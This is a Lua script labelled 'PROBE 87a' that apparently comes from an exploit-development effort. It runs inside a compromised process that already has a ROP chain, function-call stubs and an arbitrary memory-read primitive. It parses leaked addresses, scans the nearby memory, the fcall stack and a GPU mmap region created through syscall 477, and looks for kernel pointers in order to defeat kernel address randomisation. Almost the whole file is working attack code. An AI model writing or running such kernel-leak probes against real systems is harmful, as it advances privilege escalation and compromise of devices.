-- CRASH_CLASS: LOW
-- PROBE 87a: Scan process memory for kernel pointers
-- native.read_buffer works on userland. Walk structures that might
-- contain kernel pointers stored in userland-accessible memory.
-- Also test if native.read_buffer can read kernel VA (pcall-wrapped).

print("=== PROBE 87a ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Step 1: Scan the pipe object's tostring for addresses
print("--- PIPE TOSTRING ---")
local pipe_str = tostring(syscall.pipe)
print(pipe_str:sub(1, 200))

-- Step 2: Get all addresses from the pipe representation
local rop_addr = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_addr = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("rop=" .. tostring(rop_addr))
print("fn=" .. tostring(fn_addr))

-- Step 3: Read memory around fn_addr and rop_addr looking for kernel ptrs
print("")
print("--- SCAN AROUND FN_ADDR ---")
if fn_addr then
    local fa = uint64(fn_addr)
    -- Read 256 bytes around fn_addr
    local ok, data = pcall(native.read_buffer, fa, 256)
    if ok and data then
        print("read " .. #data .. " bytes from fn_addr region")
        for i = 1, #data - 7, 8 do
            local b1, b2, b3, b4, b5, b6, b7, b8 = data:byte(i, i+7)
            local lo = b1 + b2*256 + b3*65536 + b4*16777216
            local hi = b5 + b6*256 + b7*65536 + b8*16777216
            if hi >= 0xFFFF8000 then
                print(string.format("  +0x%02X: KPTR 0x%08X%08X", i-1, hi, lo))
            end
        end
    else
        print("fail: " .. tostring(data))
    end
end

-- Step 4: Scan the ROP chain memory region
print("")
print("--- SCAN ROP CHAIN ---")
if rop_addr then
    local ra = uint64(rop_addr)
    local ok, data = pcall(native.read_buffer, ra, 512)
    if ok and data then
        print("read " .. #data .. " bytes from rop chain")
        local kcount = 0
        for i = 1, #data - 7, 8 do
            local b1, b2, b3, b4, b5, b6, b7, b8 = data:byte(i, i+7)
            local lo = b1 + b2*256 + b3*65536 + b4*16777216
            local hi = b5 + b6*256 + b7*65536 + b8*16777216
            if hi >= 0xFFFF8000 then
                kcount = kcount + 1
                print(string.format("  +0x%03X: KPTR 0x%08X%08X", i-1, hi, lo))
            end
        end
        print("kptr_count=" .. kcount)
    end
end

-- Step 5: Scan native_cmd_handler and related structures
print("")
print("--- NATIVE_CMD_HANDLER ---")
if native and native.storage then
    for k, v in pairs(native.storage) do
        print("storage." .. tostring(k) .. "=" .. type(v) .. " " .. tostring(v))
    end
end

-- Step 6: Scan fcall chain data
print("")
print("--- FCALL CHAIN REGION ---")
if fcall and fcall.chain and fcall.chain.stack_base then
    local sb = fcall.chain.stack_base
    print("stack_base=" .. tostring(sb))
    local ok, data = pcall(native.read_buffer, sb, 256)
    if ok and data then
        for i = 1, #data - 7, 8 do
            local b1, b2, b3, b4, b5, b6, b7, b8 = data:byte(i, i+7)
            local lo = b1 + b2*256 + b3*65536 + b4*16777216
            local hi = b5 + b6*256 + b7*65536 + b8*16777216
            if hi >= 0xFFFF8000 then
                print(string.format("  +0x%03X: KPTR 0x%08X%08X", i-1, hi, lo))
            end
        end
    end
end

-- Step 7: Scan the GPU mmap region for kernel pointers leaked by DMA
print("")
print("--- GPU MMAP REGION ---")
local gpu = make_syscall(477)(uint64(0), uint64(16*0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
print("gpu=" .. tostring(gpu))
local gpu_hi, gpu_lo = get_hi_lo(gpu)
if gpu_hi ~= 0xFFFFFFFF and gpu_lo ~= 0xFFFFFFFF then
    local ok, data = pcall(native.read_buffer, gpu, 512)
    if ok and data then
        local kcount = 0
        for i = 1, #data - 7, 8 do
            local b1, b2, b3, b4, b5, b6, b7, b8 = data:byte(i, i+7)
            local lo = b1 + b2*256 + b3*65536 + b4*16777216
            local hi = b5 + b6*256 + b7*65536 + b8*16777216
            if hi >= 0xFFFF8000 then
                kcount = kcount + 1
                if kcount <= 5 then
                    print(string.format("  +0x%03X: KPTR 0x%08X%08X", i-1, hi, lo))
                end
            end
        end
        print("kptr_count=" .. kcount)
    end
end

print("=== PROBE 87a COMPLETE ===")
